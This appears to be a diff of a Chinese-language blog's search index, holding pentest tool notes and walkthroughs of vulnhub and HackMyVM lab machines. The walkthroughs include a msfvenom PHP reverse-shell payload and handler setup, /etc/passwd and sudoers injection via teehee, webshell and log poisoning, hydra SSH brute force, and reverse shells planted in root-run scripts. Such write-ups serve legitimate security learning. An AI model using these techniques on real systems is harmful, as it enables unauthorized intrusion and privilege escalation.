-<h2 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a>gobuster</h2><p><code>gobuster</code> 是一个用 Go 语言编写的目录 &#x2F; 文件扫描工具，常用于渗透测试和安全审计中，目的是通过暴力破解或字典攻击来发现 Web 服务器上的隐藏目录和文件。<br><code>gobuster dir -u http://example.com -w /path/to/wordlist.txt</code><br>默认字典目录在<code>/usr/share/wordlists/dirbuster/</code> 下<br>-s 指定要显示的http状态码   -t指定线程 一般用50 60<br>字典位置：&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;<br><img src="https://pic1.imgdb.cn/item/679b3f5ed0e0a243d4f8ac2d.png"><br>一般是dirsearch没有发现有用的内容的时候用这个扫描器  用这个 medium字典</p>
-<h2 id="Enum4Linux"><a href="#Enum4Linux" class="headerlink" title="Enum4Linux"></a>Enum4Linux</h2><p><strong><code>enum4linux</code></strong> 是一款用于 Linux 系统上的 SMB（Server Message Block）协议枚举工具，常用于网络安全测试中进行 Windows 系统的枚举。它能够帮助渗透测试人员获取有关 Windows 系统的详细信息，例如共享资源、用户账户、操作系统版本、域名等。<br>功能和smbmap差不多</p>
-<h3 id="常用参数和示例"><a href="#常用参数和示例" class="headerlink" title="常用参数和示例"></a>常用参数和示例</h3><table>
-<thead>
-<tr>
-<th>命令</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>enum4linux -S &lt;target_ip&gt;</code></td>
-<td>列出目标系统的共享资源。</td>
-</tr>
-<tr>
-<td><code>smbmap -H &lt;target_ip&gt;</code></td>
-<td>列出目标系统的共享资源（替代 <code>enum4linux -S</code>）。</td>
-</tr>
-<tr>
-<td><code>enum4linux -O &lt;target_ip&gt;</code></td>
-<td>获取目标 Windows 系统的操作系统版本。</td>
-</tr>
-<tr>
-<td><code>enum4linux -U &lt;target_ip&gt;</code></td>
-<td>列出目标计算机上的所有用户账户。</td>
-</tr>
-<tr>
-<td><code>enum4linux -P &lt;target_ip&gt;</code></td>
-<td>获取目标主机上用户的登录历史信息。</td>
-</tr>
-<tr>
-<td><code>enum4linux -A &lt;target_ip&gt;</code></td>
-<td>请求更多的枚举信息，包括共享、用户等数据。</td>
-</tr>
-<tr>
-<td><code>enum4linux -G &lt;target_ip&gt;</code></td>
-<td>获取目标系统上组的相关信息。</td>
-</tr>
-</tbody></table>
-<h2 id="stegseek"><a href="#stegseek" class="headerlink" title="stegseek"></a>stegseek</h2><p>Stegseek 是一款快速的 <strong>JPEG 隐写分析工具</strong>，专门用于破解 <code>steghide</code> 隐写的图片文件。它可以 <strong>高效爆破密码</strong>，并提取隐藏数据。</p>
-<p>Stegseek 主要功能包括：</p>
-<ul>
-<li><p><strong>快速爆破密码</strong>：基于字典的攻击，速度极快。</p>
-</li>
-<li><p><strong>提取隐藏数据</strong>：无需密码时，尝试默认密码或空密码提取。</p>
-</li>
-<li><p><strong>检查图片是否含有隐写数据</strong>。</p>
-</li>
-</ul>
-<h3 id="常用参数-6"><a href="#常用参数-6" class="headerlink" title="常用参数"></a>常用参数</h3><table>
-<thead>
-<tr>
-<th>参数</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>-sf</code>, <code>--stegofile</code></td>
-<td>选择隐写文件</td>
-</tr>
-<tr>
-<td><code>-wl</code>, <code>--wordlist</code></td>
-<td>选择密码字典文件，用于暴力破解</td>
-</tr>
-<tr>
-<td><code>-xf</code>, <code>--extractfile</code></td>
-<td>指定提取数据时的文件名</td>
-</tr>
-<tr>
-<td><code>-t</code>, <code>--threads</code></td>
-<td>设定线程数量，默认为 CPU 核心数</td>
-</tr>
-<tr>
-<td><code>-f</code>, <code>--force</code></td>
-<td>强制覆盖已存在的文件</td>
-</tr>
-<tr>
-<td><code>-v</code>, <code>--verbose</code></td>
-<td>显示详细信息</td>
-</tr>
-<tr>
-<td><code>-q</code>, <code>--quiet</code></td>
-<td>隐藏性能指标（可能提升性能）</td>
-</tr>
-<tr>
-<td><code>-s</code>, <code>--skipdefault</code></td>
-<td>不使用默认猜测（如空密码、文件名等）</td>
-</tr>
-<tr>
-<td><code>-n</code>, <code>--nocolor</code></td>
-<td>禁用终端输出的颜色</td>
-</tr>
-<tr>
-<td><code>-c</code>, <code>--continue</code></td>
-<td>在找到结果后继续破解（可能存在多个嵌入文件）</td>
-</tr>
-<tr>
-<td><code>-a</code>, <code>--accessible</code></td>
-<td>简化输出，使其更适用于屏幕阅读器</td>
-</tr>
-</tbody></table>
-<p>一般指定rockyou字典就可以</p>
-]]></content>
-      <categories>
-        <category>linux</category>
-        <category>笔记</category>
-      </categories>
-      <tags>
-        <tag>linux</tag>
-        <tag>操作系统</tag>
-        <tag>kali</tag>
-        <tag>工具</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HMV-Alzheimer</title>
-    <url>/posts/16384.html</url>
-    <content><![CDATA[<p>HMV-Alzheimer靶场复盘</p>
-<span id="more"></span>
-<p><img src="https://pic1.imgdb.cn/item/679a35f1d0e0a243d4f878cb.png"></p>
-<h1 id="Alzheimer"><a href="#Alzheimer" class="headerlink" title="Alzheimer"></a>Alzheimer</h1><h2 id="端口扫描-信息收集"><a href="#端口扫描-信息收集" class="headerlink" title="端口扫描&#x2F;信息收集"></a>端口扫描&#x2F;信息收集</h2><p> <img src="https://pic1.imgdb.cn/item/679a400bd0e0a243d4f87a4b.png"><br>三个端口  只有21端口现在是开放的  80和22都是有防火墙<br>先尝试能不能匿名登录ftp  然后上传反弹shell文件<br><img src="https://pic1.imgdb.cn/item/679a4010d0e0a243d4f87a4c.png"><br>发现有一个.secretnote.txt 下载到本地查看<br><img src="https://pic1.imgdb.cn/item/679a4014d0e0a243d4f87a4d.png"><br>提示我们要用knock服务 按这个顺序发送请求包才能打开端口</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="YAML"><figure class="iseeu highlight /yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">┌──(root㉿kakeru)-[~/alz]</span></span><br><span class="line"><span class="string">└─#</span> <span class="string">knock</span> <span class="string">-u</span> <span class="number">192.168</span><span class="number">.240</span><span class="number">.125</span> <span class="number">1000 </span><span class="number">2000 </span><span class="number">3000</span></span><br></pre></td></tr></table></figure></div>
-<p>但是敲门之后还是无法打开两个端口  查了wp  发现和橘墨大佬的问题一样 因为我修改过网卡，所以去修改靶机的knockd配置文件<br><img src="https://pic1.imgdb.cn/item/679a4014d0e0a243d4f87a4e.png" alt="|500"><br><code>service knockd restart</code><br><img src="https://pic1.imgdb.cn/item/679a403ed0e0a243d4f87a59.png"><br>修改配置文件之后在knock就可以访问80端口了</p>
-<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p><img src="https://pic1.imgdb.cn/item/679a403fd0e0a243d4f87a5a.png"><br>提示密码存在一个.txt文件中  用户名是 medusa   并且给了一个摩丝密码 nothing<br>现在进行目录扫描<br><img src="https://pic1.imgdb.cn/item/679a4044d0e0a243d4f87a5b.png"><br>这里给了三个重定向的目录 一次访问试试</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GHERKIN"><figure class="iseeu highlight /gherkin"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/alz]</span><br><span class="line">└─<span class="comment"># curl 192.168.240.224/secret/</span></span><br><span class="line">Maybe my password is in this secret folder?</span><br><span class="line">┌──(root㉿kakeru)-[~/alz]</span><br><span class="line">└─<span class="comment"># curl 192.168.240.224/home/  </span></span><br><span class="line">Maybe my pass is at home!</span><br><span class="line">-medusa</span><br><span class="line">┌──(root㉿kakeru)-[~/alz]</span><br><span class="line">└─<span class="comment"># curl 192.168.240.224/admin/</span></span><br><span class="line"><span class="variable">&lt;html&gt;</span></span><br><span class="line"><span class="variable">&lt;head&gt;</span><span class="variable">&lt;title&gt;</span>403 Forbidden<span class="variable">&lt;/title&gt;</span><span class="variable">&lt;/head&gt;</span></span><br><span class="line"><span class="variable">&lt;body bgcolor=&quot;white&quot;&gt;</span></span><br><span class="line"><span class="variable">&lt;center&gt;</span><span class="variable">&lt;h1&gt;</span>403 Forbidden<span class="variable">&lt;/h1&gt;</span><span class="variable">&lt;/center&gt;</span></span><br><span class="line"><span class="variable">&lt;hr&gt;</span><span class="variable">&lt;center&gt;</span>nginx/1.14.2<span class="variable">&lt;/center&gt;</span></span><br><span class="line"><span class="variable">&lt;/body&gt;</span></span><br><span class="line"><span class="variable">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure></div>
-
-<p>提示密码在secret目录中 又在文件home中所以访问&#x2F;secret&#x2F;home&#x2F;</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/alz]</span><br><span class="line">└─<span class="comment"># curl 192.168.240.224/secret/home/</span></span><br><span class="line"></span><br><span class="line">Im trying a lot. Im sure <span class="keyword">that</span> i will recover <span class="keyword">my</span> pass!</span><br><span class="line"></span><br><span class="line">-medusa</span><br></pre></td></tr></table></figure></div>
-<p>还是没有直接的密码<br>没有思路查看wp后才知道密码藏在ftp里面 但是是在knock之后过的ftp中  这个老六。。。<br><img src="https://pic1.imgdb.cn/item/679a4045d0e0a243d4f87a5d.png"><br>这个就是medusa的密码<br><img src="https://pic1.imgdb.cn/item/679a4047d0e0a243d4f87a5e.png"><br>拿到shell</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="https://pic1.imgdb.cn/item/679a407ed0e0a243d4f87a61.png"><br>发现有sudo命令  但是这个无法提权<br>继续查suid文件<br><img src="https://pic1.imgdb.cn/item/679a4083d0e0a243d4f87a64.png"><br>搜索都可以用capsh提权<br><img src="https://pic1.imgdb.cn/item/679a407fd0e0a243d4f87a62.png"><br><img src="https://pic1.imgdb.cn/item/679a4082d0e0a243d4f87a63.png"><br>拿到flag</p>
-<p>密码存在knock之后的ftp的文件中也太阴险了。。。</p>
-]]></content>
-      <categories>
-        <category>靶场</category>
-        <category>hmv</category>
-      </categories>
-      <tags>
-        <tag>渗透</tag>
-        <tag>HMV</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>DC2靶场复盘</title>
     <url>/posts/3469.html</url>
     <content><![CDATA[<p>vulnhub-DC2靶场复盘</p>
@@ -1374,14 +1383,20 @@
       </tags>
   </entry>
   <entry>
-    <title>DC3靶场复盘</title>
-    <url>/posts/35983.html</url>
-    <content><![CDATA[<p>vulnhub-DC3靶场复盘</p>
+    <title>DC4靶场复盘</title>
+    <url>/posts/52100.html</url>
+    <content><![CDATA[<p>vulnhub-DC4靶场复盘</p>
 <span id="more"></span>
-<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="https://pic1.imgdb.cn/item/679a237dd0e0a243d4f8768f.png" alt="|450"><br>nmap扫描这个端口之后 可以得到一些更重要的信息   比如这个网站用的cms是joomla<br>用searchsploit可以发现有非常多的漏洞  百度之后发现有一个扫描器 joomscan</p>
-<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p><img src="https://pic1.imgdb.cn/item/679a237ed0e0a243d4f87690.png" alt="|450"><br>web界面只有一个登录界面 可以尝试直接爆破 但是从结果来说 确实可以爆破 而且账户也存在<br>但是这里不是实际的管理界面<br><img src="https://pic1.imgdb.cn/item/679a237ed0e0a243d4f87691.png"><br>用joomscan可以找到真实的管理员登录界面   我们用password.lst 爆破可以得到密码<br><img src="https://pic1.imgdb.cn/item/679a237fd0e0a243d4f87692.png" alt="|475"><br><img src="https://pic1.imgdb.cn/item/679a237fd0e0a243d4f87693.png" alt="|500"><br>这个管理界面没有可以注入的点<br><img src="https://pic1.imgdb.cn/item/679a23e3d0e0a243d4f8769b.png" alt="|475"><br>在模板中 可以看到php文件 我们可以在index.php中直接插入php代码  比如phpinfo() 到网站首页之后发现成功了<br>（这里如果要在index中插入必须要是用的和网站现在用的模板一样才可以  如果在html文件夹里面插入就不用管<br>然后上传php一句话木马 用蚁剑连接 拿到webshell<br>但是这里没有nc指令 我们要用到msfconsole<br> 先输入msfconsole进入命令面板   <code>use payload/php/meterpreter/reverse_tcp</code><br><img src="https://pic1.imgdb.cn/item/679a237fd0e0a243d4f87693.png" alt="|450"><br>然后需要用<mark>msfvenom</mark>生成攻击文件<br>  <code>msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.240.11 lport=1234 &gt; a.php </code><br>接着回到msfconsole  用 <code>use exploit/multi/handler</code>  这是一个监听器  然后设置payload  <code>set payload php/meterpreter/reverse_tcp</code><br>show options 查看需要配置什么<br> <code>set lhost 192.168.240.11</code>  <code>set lpost 1234</code>   最后run就可以了<br>在web界面刷新刚才插入payload php代码的界面  就可以在msf中看到成功连接了<br><img src="https://pic1.imgdb.cn/item/679a23e5d0e0a243d4f8769d.png" alt="|500"><br>输入shell 进入</p>
-<h3 id="2用joomla漏洞-非爆破"><a href="#2用joomla漏洞-非爆破" class="headerlink" title="2用joomla漏洞 (非爆破)"></a>2用joomla漏洞 (非爆破)</h3><p>用searchsploit 搜索joomla + 版本号<br>这个脚本告诉我们了sqlmap使用的sqlmap<br><img src="https://pic1.imgdb.cn/item/679a2415d0e0a243d4f876a2.png"><br>到columns这里要注意一点 这里用自动就什么都没有  而且因为这个表名有# 有用引号括起来<br><img src="https://pic1.imgdb.cn/item/679a2415d0e0a243d4f876a3.png" alt="|500"><br>同样可以得到这个密码</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>可以做一些常规的操作比如suid  系统漏洞等  suid没有可以利用的 但是系统比较老 可以用内核提权<br>.linux系统漏洞提权<br>先在webshell里面用<code>cat /etc/*releas</code> 得到当前ubuntu系统的版本号  DISTRIB_RELEASE&#x3D;16.04<br><code>uname -a</code> 查看内核版本   Linux DC-3 4.4.0-21-generic<br>然后用searchsploit 找到漏洞利用脚本（必须同时满足系统和内核版本）  这里给的网址已经失效 需要我们去仓库 找到新的地方<br>把下载下来的文件用scp复制到kali 的&#x2F;var&#x2F;www&#x2F;html中  然后在webshell用wget下载这个利用脚本<br>解压之后 运行脚本就可以提权了<br><img src="https://pic1.imgdb.cn/item/679a23e6d0e0a243d4f8769f.png" alt="|475"></p>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>这个靶机开放80和22端口   没有什么多余信息</p>
+<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p><img src="https://pic1.imgdb.cn/item/679a1f99d0e0a243d4f87640.png" alt="|400"><br>只有一个登录界面  只能爆破  用bp爆破得到admin密码 登入管理员界面<br><img src="https://pic1.imgdb.cn/item/679a20f5d0e0a243d4f87658.png" alt="|500"><br><img src="https://pic1.imgdb.cn/item/679a20f6d0e0a243d4f87659.png" alt="|825"><br>这里的界面可以运行一些shell的指令 猜测在页面的请求包里面有指令 用bp试试<br><img src="https://pic1.imgdb.cn/item/679a20f7d0e0a243d4f8765a.pngg" alt="500"><br>发现果然是  空格用+绕过 现在就把指令变成反弹shell  拿到www的shell</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>这题提权方式有很多种</p>
+<h3 id="1用exim漏洞"><a href="#1用exim漏洞" class="headerlink" title="1用exim漏洞"></a>1用exim漏洞</h3><p>步骤和DC8一模一样</p>
+<h3 id="2访问不同用户的信息"><a href="#2访问不同用户的信息" class="headerlink" title="2访问不同用户的信息"></a>2访问不同用户的信息</h3><p><img src="https://pic1.imgdb.cn/item/679a20f8d0e0a243d4f8765b.png"><br>在home目录下面有三个用户<br><img src="https://pic1.imgdb.cn/item/679a2129d0e0a243d4f8765e.png" alt="|500"><br>jim这里有一个只有jim可以读写的文件 肯定有东西   在目录backups下面有一些密码<br>现在用爆破看看是否能登录jim的ssh<br>通过hydra成功进入ssh <code>hydra -l jim -P pass.txt ssh://192.168.240.249</code><br><img src="https://pic1.imgdb.cn/item/679a2129d0e0a243d4f8765f.png"><br>登录到jim看到mbox中的内容是一封邮件 但是没有什么有用的信息<br>到&#x2F;var&#x2F;mail路径下 看到有一个jim邮件  里面有另一个用户的密码  登录到charles中 (这里邮件中的C是大写的 但是登录ssh要用小写c不知道为什么)<br><img src="https://pic1.imgdb.cn/item/679a212ad0e0a243d4f87660.png" alt="|500"><br>发现这个用户有一个用root执行teehee的权限<br>有两种方式用teehee提权  一种是<br> <code>echo &quot;raaj::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</code><br><mark>可以看到teehee可以把一个语句加到某个文件里面</mark>  这里是新建了一个用户有了root权限<br>也可以用teehee把charles变成一个超级用户 写到&#x2F;etc&#x2F;sudoers 中<br> <code>echo &quot;charles ALL=(ALL:ALL) ALL&quot; | sudo teehee -a /etc/sudoers</code><br>这里sudo要写在分隔符后面 因为是有root权限执行teehee</p>
+<h2 id="用test-sh"><a href="#用test-sh" class="headerlink" title="用test.sh"></a>用test.sh</h2><p>刚才jim目录下有一个test.sh 文件 权限是-rwsrwxrwx<br><img src="https://pic1.imgdb.cn/item/679a212ad0e0a243d4f87661.png" alt="|500"><br><strong>SUID (Set User ID)</strong>：</p>
+<ul>
+<li>当文件的执行权限中出现 <code>s</code> （在所有者权限位置），表示该文件是设置了 SUID 权限。SUID 权限让用户执行这个文件时，程序以文件所有者的权限运行，而不是以执行它的用户的权限运行。</li>
+<li>例如，如果文件的所有者是 <code>root</code>，那么无论哪个用户执行该文件，都会以 <code>root</code> 权限运行它。<br>所以可以在文件后面加上一句反弹shell  用root身份执行 就可以拿到rootshell<br><img src="https://pic1.imgdb.cn/item/679a212bd0e0a243d4f87662.png"></li>
+</ul>
 ]]></content>
       <categories>
         <category>靶场</category>
@@ -1393,34 +1408,13 @@
       </tags>
   </entry>
   <entry>
-    <title>DC8靶场复盘</title>
-    <url>/posts/51727.html</url>
-    <content><![CDATA[<p>vulnhub-DC8靶场复盘</p>
+    <title>DC5靶场复盘</title>
+    <url>/posts/19078.html</url>
+    <content><![CDATA[<p>vulnhub-DC5靶场复盘</p>
 <span id="more"></span>
-<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>这个主要考察从web端进入</p>
-<h1 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h1><p>0.用dirsearch找到网页所有的目录  知道有mysql服务 暗示要sql注入  而且有robots.txt 其中有user&#x2F;login目录<br>1.在网页点击其他链接的时候看到url有参数 尝试注释闭合<br>发现有sql注入点<br><img src="https://pic1.imgdb.cn/item/679a1620d0e0a243d4f87546.png" alt="|550"><br>2.用sqlmap得到管理员账号<br><img src="https://pic1.imgdb.cn/item/679a1620d0e0a243d4f87547.png" alt="|500"><br>最终找到两条记录 然后将这个hash放到一个目录用john 去跑 可以找到john的密码<br>3.登录网站管理员的账号<br>有一个edit选项 里面可以上传文件 但是无法上传php文件<br><img src="https://pic1.imgdb.cn/item/679a1621d0e0a243d4f87548.png" alt="|500"><br>在contactus webform 发现可以修改用户上传之后的提示回显  并且可以用PHP代码 实验之后发现确实可以渲染php<br>现在可以用system指令来反弹shell<br><img src="https://pic1.imgdb.cn/item/679a1621d0e0a243d4f87549.png" alt="|525"><br><img src="https://pic1.imgdb.cn/item/679a1622d0e0a243d4f8754a.png"><br>这个指令可以在反弹的shell里面加上前缀 可以美化输出<br>随便看看这个用户目录下的文件 </p>
-<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null  意思从根目录开始找 所有者是root 只包括suid 的 然后将标准错误不输出<br><img src="https://pic1.imgdb.cn/item/679a1666d0e0a243d4f8754f.png" alt="|500"><br>这里利用exim提权（先查看这里exim4的版本  用searchsploit exim发现漏洞<br>然后把文件复制到&#x2F;var&#x2F;www&#x2F;html 下方便传输到受害机<br><img src="https://pic1.imgdb.cn/item/679a1669d0e0a243d4f87550.png" alt="|425"><br>在受害机上面用wget接受这个脚本<br><img src="https://pic1.imgdb.cn/item/679a166ad0e0a243d4f87551.png"><br><img src="https://pic1.imgdb.cn/item/679a166bd0e0a243d4f87552.png"><br>有两种方法使用这个脚本 选择第二种 因为 第二种在脚本说可以有一个shell<br>但是如果我们用 cat -A 查看这个a.sh 文件发现 末尾都是^M<br>用dos2unix转换之后 可以运行   bash a.sh -m netcat<br><img src="https://pic1.imgdb.cn/item/679a166cd0e0a243d4f87553.png" alt="|450"><br>发现成功提权 然后到&#x2F;root目录下 就解决！！ </p>
-]]></content>
-      <categories>
-        <category>靶场</category>
-        <category>vulnhub</category>
-      </categories>
-      <tags>
-        <tag>渗透</tag>
-        <tag>vulnhub</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>DC7靶场复盘</title>
-    <url>/posts/51728.html</url>
-    <content><![CDATA[<p>vulnhub-DC7靶场复盘</p>
-<span id="more"></span>
-<p>最难的是最开始的信息收集 ！！！ 根据网站提示的到外部找信息 一下下面的D7user 去github找到<mark>敏感信息泄漏</mark></p>
-<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="https://pic1.imgdb.cn/item/679a17c7d0e0a243d4f87577.png" alt="|250"><br><img src="https://pic1.imgdb.cn/item/679a17c8d0e0a243d4f87578.png" alt="|400"><br>nmap -A扫描之后发现80端口下面的目录结构 并且看到http是用Drupal 这个软件支持的 （后面回用到</p>
-<h2 id="web-探测-信息收集"><a href="#web-探测-信息收集" class="headerlink" title="web 探测 + 信息收集"></a>web 探测 + 信息收集</h2><p>用dirsearch跑一下目录 也没有发现什么有用的网页<br>页面上有一个搜索框 用sqlmap尝试发现没有注入点<br><img src="https://pic1.imgdb.cn/item/679a17c8d0e0a243d4f87579.png"><br>网站首页提示了用目录爆破不会成功 去外面找信息 –&gt; github<br><img src="https://pic1.imgdb.cn/item/679a17c9d0e0a243d4f8757a.png" alt="|425"><br>在github成功找到了这个用户<br><img src="https://pic1.imgdb.cn/item/679a17c9d0e0a243d4f8757b.png" alt="|450"><br>在config.php 中找到了用户名和密码 尝试在网站登录  失败  我们就登录ssh  拿到shell</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="https://pic1.imgdb.cn/item/679a1814d0e0a243d4f8758a.png" alt="|575"><br>发现有一个叫做mbox的文件 里面是root发送的 并且好像每十五分钟发送一次<br>看一下这里的sh里有什么内容</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">dc7user@dc-7:~$ <span class="built_in">cat</span> /opt/scripts/backups.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="built_in">rm</span> /home/dc7user/backups/*</span><br><span class="line"><span class="built_in">cd</span> /var/www/html/</span><br><span class="line">drush sql-dump --result-file=/home/dc7user/backups/website.sql</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">tar -czf /home/dc7user/backups/website.tar.gz html/</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz</span><br><span class="line"><span class="built_in">chown</span> dc7user:dc7user /home/dc7user/backups/*</span><br><span class="line"><span class="built_in">rm</span> /home/dc7user/backups/website.sql</span><br><span class="line"><span class="built_in">rm</span> /home/dc7user/backups/website.tar.gz</span><br><span class="line">You have new mail <span class="keyword">in</span> /var/mail/dc7user</span><br></pre></td></tr></table></figure></div>
-<p>这里看到有用到drush这个服务<br><img src="https://pic1.imgdb.cn/item/679a1815d0e0a243d4f8758e.png"><br>而且可以看到这个文件的属主是root  只有www-data这个用户可以写入 我们只有一个读权限<br>现在我们的目标就是把root的shell用nc -e 反弹到本机  就是把这个语句写到这个脚本里面让他执行<br>现在的目的就是如何拿到www-data的shell   <mark>用drush</mark><br>根据搜索的知识 drush一般要在站点所在的目录下操作<br><code>cd /var/www/html     drush user-information admin </code><br> 可以查到管理的信息<br>然后再修改管理的密码 登录到web里面<br><img src="https://pic1.imgdb.cn/item/679a1816d0e0a243d4f87590.png" alt="|475"><br>但是发现这里和上一个靶机不一样 没有php的选项    搜索资料知道可以去下载插件<br>在网页上用php代码 写上反弹shell<br>现在就是用这个www用户把反弹shell语句写到刚才的那个脚本中  然后等到十五分的时候自动执行<br>完成！！ </p>
+<h2 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h2><p>这题的靶场提示要在web找到刷新改变的东西<br><img src="https://pic1.imgdb.cn/item/679a1f6ed0e0a243d4f87639.png"><br>这个靶机只有一个80端口 没有22ssh端口<br>而且这个网站没有用cms  是一个静态的页面</p>
+<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p>在contact us 里有输入框 用sqlmap 扫描之后没有注入点<br>在contact us 输入内容返回的thank you.php 界面刷新 发现下面的footer会刷新 查看页面源代码<br><img src="https://pic1.imgdb.cn/item/679a1f6fd0e0a243d4f8763a.png" alt="|450"><br>这个界面是有一个footer.php的 所以这里有一个文件包含漏洞  因为是其他有调用这个footer.php<br>但是现在不知道用什么关键字访问到包含文件  所以我们用wfuzz跑关键字<br><img src="https://pic1.imgdb.cn/item/679a1f6fd0e0a243d4f8763b.png" alt="|575"><br><img src="https://pic1.imgdb.cn/item/679a1f70d0e0a243d4f8763c.png"><br>找到了关键字是file  现在就可以访问服务器中的文件了   <strong>现在的又一个难题是只能看到文件如何才能拿到shell呢</strong><br>我们知道如果可以写入一个一句话木马就可以拿到shell   但是应该用什么方式实现呢？<br>用apache2服务访问的日志 错误日志也会存 存在&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log 中  这里没有我们就用nginx<br>下一步就是用bp修改<br><img src="https://pic1.imgdb.cn/item/679a1f70d0e0a243d4f8763c.png" alt="|425"><br>这一条记录会在access.log中<br><img src="https://pic1.imgdb.cn/item/679a1f98d0e0a243d4f8763e.png"><br>我们的标记存在 而且后面的php代码没有显示出来 说明被成功解析了  用蚁剑连接shell</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在上一步拿到蚁剑的shell之后反弹到本机中<br>提权思路还是找到存在漏洞的服务<br><img src="https://pic1.imgdb.cn/item/679a1f98d0e0a243d4f8763f.png" alt="|450"><br>这里有一个screen服务而且告诉了版本号 大概率就是利用这个<br>然后用wget 从靶机下载本机的这个脚本  <mark>注意这个脚本不能再www目录下运行  在其他目录下wget</mark><br>运行之后拿到root权限 解决！！！ </p>
 ]]></content>
       <categories>
         <category>靶场</category>
@@ -1453,6 +1447,46 @@
       </tags>
   </entry>
   <entry>
+    <title>DC3靶场复盘</title>
+    <url>/posts/35983.html</url>
+    <content><![CDATA[<p>vulnhub-DC3靶场复盘</p>
+<span id="more"></span>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="https://pic1.imgdb.cn/item/679a237dd0e0a243d4f8768f.png" alt="|450"><br>nmap扫描这个端口之后 可以得到一些更重要的信息   比如这个网站用的cms是joomla<br>用searchsploit可以发现有非常多的漏洞  百度之后发现有一个扫描器 joomscan</p>
+<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p><img src="https://pic1.imgdb.cn/item/679a237ed0e0a243d4f87690.png" alt="|450"><br>web界面只有一个登录界面 可以尝试直接爆破 但是从结果来说 确实可以爆破 而且账户也存在<br>但是这里不是实际的管理界面<br><img src="https://pic1.imgdb.cn/item/679a237ed0e0a243d4f87691.png"><br>用joomscan可以找到真实的管理员登录界面   我们用password.lst 爆破可以得到密码<br><img src="https://pic1.imgdb.cn/item/679a237fd0e0a243d4f87692.png" alt="|475"><br><img src="https://pic1.imgdb.cn/item/679a237fd0e0a243d4f87693.png" alt="|500"><br>这个管理界面没有可以注入的点<br><img src="https://pic1.imgdb.cn/item/679a23e3d0e0a243d4f8769b.png" alt="|475"><br>在模板中 可以看到php文件 我们可以在index.php中直接插入php代码  比如phpinfo() 到网站首页之后发现成功了<br>（这里如果要在index中插入必须要是用的和网站现在用的模板一样才可以  如果在html文件夹里面插入就不用管<br>然后上传php一句话木马 用蚁剑连接 拿到webshell<br>但是这里没有nc指令 我们要用到msfconsole<br> 先输入msfconsole进入命令面板   <code>use payload/php/meterpreter/reverse_tcp</code><br><img src="https://pic1.imgdb.cn/item/679a237fd0e0a243d4f87693.png" alt="|450"><br>然后需要用<mark>msfvenom</mark>生成攻击文件<br>  <code>msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.240.11 lport=1234 &gt; a.php </code><br>接着回到msfconsole  用 <code>use exploit/multi/handler</code>  这是一个监听器  然后设置payload  <code>set payload php/meterpreter/reverse_tcp</code><br>show options 查看需要配置什么<br> <code>set lhost 192.168.240.11</code>  <code>set lpost 1234</code>   最后run就可以了<br>在web界面刷新刚才插入payload php代码的界面  就可以在msf中看到成功连接了<br><img src="https://pic1.imgdb.cn/item/679a23e5d0e0a243d4f8769d.png" alt="|500"><br>输入shell 进入</p>
